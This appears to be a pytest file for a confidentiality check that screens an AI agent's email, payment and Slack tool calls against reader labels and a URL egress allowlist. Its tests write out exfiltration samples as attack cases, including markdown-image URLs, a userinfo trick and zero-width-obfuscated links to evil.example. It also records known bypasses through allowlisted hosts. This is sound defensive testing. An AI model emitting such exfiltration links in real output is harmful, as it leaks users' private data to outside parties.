"""Step 5 (confidentiality): reader rule for destinations and the egress allowlist for URLs."""

from collections.abc import Callable
from dataclasses import replace

import pytest

from notary_core.models import IntentContract, ResolvedValue, ToolScope
from notary_core.pipeline import StepInput
from notary_core.policy.sensitive_params import DEFAULT_POLICY
from notary_core.steps.confidentiality import check_confidentiality

Make = Callable[..., StepInput]
EVE = "eve@evil.example"


@pytest.fixture
def build(
    make_input: Make,
    make_contract: Callable[..., IntentContract],
    make_scope: Callable[..., ToolScope],
    make_value: Callable[..., ResolvedValue],
) -> Callable[..., StepInput]:
    """A `send_email` call: `to` is a destination, `subject` and `body` are data."""

    def factory(
        *,
        to: str = "bob@acme.example",
        body: str = "hello",
        body_readers: tuple[str, ...] = ("*",),
        body_integrity: str = "trusted",
        subject: str = "hi",
        subject_readers: tuple[str, ...] = ("*",),
        egress: tuple[str, ...] = (),
        tool: str = "send_email",
        args: dict[str, ResolvedValue] | None = None,
    ) -> StepInput:
        resolved = args or {
            "to": make_value("v-to", to, unit="email"),
            "subject": make_value("v-subject", subject, readers=subject_readers),
            "body": make_value(
                "v-body",
                body,
                origin="email" if body_integrity == "untrusted" else "user",
                integrity=body_integrity,
                readers=body_readers,
            ),
        }
        contract = make_contract(tools=(make_scope(tool),), egress_hosts=egress)
        return make_input(tool, args=resolved, contract=contract, policy=DEFAULT_POLICY)

    return factory


@pytest.mark.attack("A5")
def test_private_file_content_to_external_recipient_is_blocked(build: Make) -> None:
    outcome = check_confidentiality(build(to=EVE, body="secret notes", body_readers=("user",)))
    assert outcome is not None
    assert (outcome.verdict, outcome.code) == ("BLOCK", "CONF_READER_VIOLATION")


@pytest.mark.invariant("I3")
def test_public_body_to_any_recipient_passes(build: Make) -> None:
    assert check_confidentiality(build(to=EVE, body="hello", body_readers=("*",))) is None


@pytest.mark.invariant("I3")
def test_reader_join_across_several_data_args(build: Make) -> None:
    inp = build(to=EVE, body_readers=("*",), subject_readers=("user",))
    outcome = check_confidentiality(inp)
    assert outcome is not None
    assert outcome.code == "CONF_READER_VIOLATION"


@pytest.mark.invariant("I3")
def test_destination_in_readers_passes(build: Make) -> None:
    inp = build(to="Alice@Acme.example", body_readers=("alice@acme.example",), subject="x")
    assert check_confidentiality(inp) is None


@pytest.mark.invariant("I3")
def test_amount_and_destination_args_do_not_taint_readers(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    args = {
        "payee": make_value("v1", "DE89370400440532013000", unit="iban", readers=("user",)),
        "amount": make_value("v2", "10.00", unit="amount", readers=("user",)),
        "reference": make_value("v3", "invoice 7", readers=("*",)),
    }
    assert check_confidentiality(build(tool="send_money", args=args)) is None


@pytest.mark.attack("A5")
def test_markdown_image_exfil_to_unlisted_host_is_blocked(build: Make) -> None:
    body = "see ![x](https://evil.example/?d=CODE)"
    outcome = check_confidentiality(build(body=body, body_integrity="untrusted"))
    assert outcome is not None
    assert (outcome.verdict, outcome.code) == ("BLOCK", "CONF_URL_NOT_ALLOWED")


@pytest.mark.attack("A5")
def test_url_with_secret_in_query_to_allowlisted_host_passes(build: Make) -> None:
    """Documented limitation: an allowlisted host can still carry data in its query string."""
    body = "![x](https://acme.example/?d=SECRET)"
    inp = build(body=body, body_integrity="untrusted", egress=("acme.example",))
    assert check_confidentiality(inp) is None


@pytest.mark.attack("A5")
def test_subdomain_of_allowlisted_domain_passes(build: Make) -> None:
    inp = build(
        body="https://mail.acme.example/x", body_integrity="untrusted", egress=("acme.example",)
    )
    assert check_confidentiality(inp) is None


@pytest.mark.attack("A5")
def test_userinfo_trick_is_checked_against_real_host(build: Make) -> None:
    inp = build(
        body="https://acme.example@evil.example/",
        body_integrity="untrusted",
        egress=("acme.example",),
    )
    outcome = check_confidentiality(inp)
    assert outcome is not None
    assert outcome.code == "CONF_URL_NOT_ALLOWED"


@pytest.mark.attack("A5")
def test_trusted_text_is_not_url_checked(build: Make) -> None:
    assert check_confidentiality(build(body="https://evil.example/x")) is None


@pytest.mark.attack("A7")
def test_zero_width_obfuscated_url_is_blocked(build: Make) -> None:
    body = "ht​tps://evil⁠.example/x"
    outcome = check_confidentiality(build(body=body, body_integrity="untrusted"))
    assert outcome is not None
    assert outcome.code == "CONF_URL_NOT_ALLOWED"


@pytest.mark.invariant("I3")
def test_no_destination_skips_reader_rule(
    build: Make, make_value: Callable[..., ResolvedValue]
) -> None:
    args = {"text": make_value("v1", "private note", readers=("user",))}
    assert check_confidentiality(build(tool="post_slack", args=args)) is None


@pytest.mark.attack("A12")
def test_block_response_is_uniform_regardless_of_secret(build: Make) -> None:
    first = check_confidentiality(build(to=EVE, body="alpha", body_readers=("user",)))
    second = check_confidentiality(build(to=EVE, body="S3CR3T-longer", body_readers=("user",)))
    assert first is not None
    assert first == second


@pytest.mark.invariant("I3")
def test_missing_stored_value_fails_closed(build: Make) -> None:
    outcome = check_confidentiality(replace(build(), values={}))
    assert outcome is not None
    assert outcome.code == "CONF_READER_VIOLATION"


@pytest.mark.invariant("I3")
def test_reader_rule_is_evaluated_before_url_rule(build: Make) -> None:
    inp = build(
        to=EVE,
        body="https://evil.example/x",
        body_integrity="untrusted",
        body_readers=("user",),
    )
    outcome = check_confidentiality(inp)
    assert outcome is not None
    assert outcome.code == "CONF_READER_VIOLATION"
